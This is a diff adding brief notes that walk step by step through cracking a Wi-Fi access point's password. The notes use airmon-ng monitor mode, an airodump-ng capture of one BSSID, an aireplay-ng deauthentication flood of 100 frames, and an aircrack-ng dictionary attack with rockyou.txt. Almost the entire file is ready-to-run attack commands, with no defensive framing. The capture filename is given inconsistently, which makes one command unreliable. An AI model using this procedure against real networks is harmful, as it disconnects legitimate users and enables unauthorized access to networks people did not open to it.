@@ -1,0 +1,17 @@
+Use a deauth attack in order to crack the password for the access point.
+	a. Put Wi-Fi Adapter in monitor mode with Airmon-Ng
+	#airmon-ng start wlan0
+
+	b. Capture traffic with Airodump-Ng
+	#airodump-ng mon0	(*mon0 is the interface that you are using)
+
+	c. Focus airodump-Ng on One AP on One Channel
+	#airodump-ng --bssid 0C:9D:92:49:C8:F8 -c 6 --write passwordcrack mon0
+
+	d. Aireplay-Ng Deauth	(*This step is conducted in a separate terminal window)
+	#aireplay-ng --deauth 100 -a 0C:9D:92:49:C8:F8 mon0
+	(*--deauth 100 is the number of times to send the deauth attack; -a is the access point's MAC address)
+
+	e. Let's Aircrack-NG That Password
+	#aircrack-ng passwordcrack.cap-01.cap -w /usr/share/wordlists/rockyou.txt
+	(*passwordcrack-01.cap is the file that the capture was written to; -w is the wordlist used to crack the password)
